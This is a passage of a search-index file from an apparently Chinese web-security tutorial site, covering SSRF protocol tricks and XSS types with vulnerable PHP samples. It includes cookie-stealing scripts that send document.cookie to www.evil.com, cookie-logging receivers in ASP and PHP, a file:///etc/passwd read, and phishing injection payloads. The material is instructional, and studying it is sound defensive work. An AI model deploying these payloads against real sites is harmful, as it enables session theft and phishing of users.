$data \" ); ?> \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c","title":"\u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf"},{"location":"web/ssrf/#_2","text":"Dict \u534f\u8bae dict://fuzz.wuyun.org:8080/helo:dict Gopher \u534f\u8bae gopher://fuzz.wuyun.org:8080/gopher File \u534f\u8bae file:///etc/passwd","title":"\u534f\u8bae\u5229\u7528"},{"location":"web/ssrf/#_3","text":"\u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0 \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/xss/","text":"XSS \u7b80\u4ecb \u00b6 \u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002 \u53cd\u5c04\u578b XSS \u00b6 \u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?> \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86 name \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002 \u6301\u4e45\u578b XSS \u00b6 \u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002 \u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = mysql_real_escape_string ( $message ); // Sanitize name input $name = mysql_real_escape_string ( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysql_query ( $query ) or die ( '<pre>' . mysql_error () . '</pre>' ); //mysql_close(); } ?> \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002 DOM XSS \u00b6 \u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002 HTML \u4ee3\u7801\uff1a < html > < head > < title > DOM-XSS test </ title > </ head > < body > < script > var a = document . URL ; document . write ( a . substring ( a . indexOf ( \"a=\" ) + 2 , a . length )); </ script > </ body > </ html > \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script> \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002 XSS \u5229\u7528\u65b9\u5f0f \u00b6 Cookies \u7a83\u53d6 \u00b6 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a < script > document . location = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie new Image (). src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie </ script > < img src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie ></ img > \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a <% msg=Request.ServerVariables(\"QUERY_STRING\") testfile=Server.MapPath(\"cookie.txt\") set fs=server.CreateObject(\"Scripting.filesystemobject\") set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\"\"&msg& \"\") thisfile.close set fs=nothing %> <?php $cookie = $_GET [ 'cookie' ]; $log = fopen ( \"cookie.txt\" , \"a\" ); fwrite ( $log , $cookie . \" \\n \" ); fclose ( $log ); ?> \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002 \u4f1a\u8bdd\u52ab\u6301 \u00b6 \u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002 \u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002 \u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002 \u9493\u9c7c \u00b6 \u91cd\u5b9a\u5411\u9493\u9c7c \u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002 http://www.bug.com/index.php?search=\"'><script>document.location.href=\"http://www.evil.com\"</script> HTML \u6ce8\u5165\u5f0f\u9493\u9c7c \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002 http://www.bug.com/index.php?search=\"'<html><head><title>login</title></head><body><div style=\"text-align:center;\"><form Method=\"POST\" Action=\"phishing.php\" Name=\"form\"><br /><br />Login:<br/><input name=\"login\" /><br />Password:<br/><input name=\"Password\" type=\"password\" /><br/><br/><input name=\"Valid\" value=\"Ok\" type=\"submit\" /><br/></form></div></body></html> \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002 iframe \u9493\u9c7c \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7 <iframe> \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002 http://www.bug.com/index.php?search='><iframe src=\"http://www.evil.com\" height=\"100%\" width=\"100%\"</iframe> Flash \u9493\u9c7c \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528 <object> \u6216 <embed> \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002 \u9ad8\u7ea7\u9493\u9c7c\u6280\u672f \u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 \u7f51\u9875\u6302\u9a6c \u00b6 \u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528 <iframe> \u6807\u7b7e\u3002 DOS \u4e0e DDOS \u00b6 \u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 XSS \u8815\u866b \u00b6 \u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002","title":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb"},{"location":"web/xss/#xss","text":"\u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002","title":"XSS \u7b80\u4ecb"},{"location":"web/xss/#xss_1","text":"\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?> \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86 name \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002","title":"\u53cd\u5c04\u578b XSS"},{"location":"web/xss/#xss_2","text":"\u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002 \u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = mysql_real_escape_string ( $message ); // Sanitize name input $name = mysql_real_escape_string ( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysql_query ( $query ) or die ( '<pre>' . mysql_error () . '</pre>' ); //mysql_close(); } ?> \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002","title":"\u6301\u4e45\u578b XSS"},{"location":"web/xss/#dom-xss","text":"\u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002 HTML \u4ee3\u7801\uff1a < html > < head > < title > DOM-XSS test </ title > </ head > < body > < script > var a = document . URL ; document . write ( a . substring ( a . indexOf ( \"a=\" ) + 2 , a . length )); </ script > </ body > </ html > \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script> \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002","title":"DOM XSS"},{"location":"web/xss/#xss_3","text":"","title":"XSS \u5229\u7528\u65b9\u5f0f"},{"location":"web/xss/#cookies","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a < script > document . location = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie new Image (). src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie </ script > < img src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie ></ img > \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a <% msg=Request.ServerVariables(\"QUERY_STRING\") testfile=Server.MapPath(\"cookie.txt\") set fs=server.CreateObject(\"Scripting.filesystemobject\") set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\"\"&msg& \"\") thisfile.close set fs=nothing %> <?php $cookie = $_GET [ 'cookie' ]; $log = fopen ( \"cookie.txt\" , \"a\" ); fwrite ( $log , $cookie . \" \\n \" ); fclose ( $log ); ?> \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002","title":"Cookies \u7a83\u53d6"},{"location":"web/xss/#_1","text":"\u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session 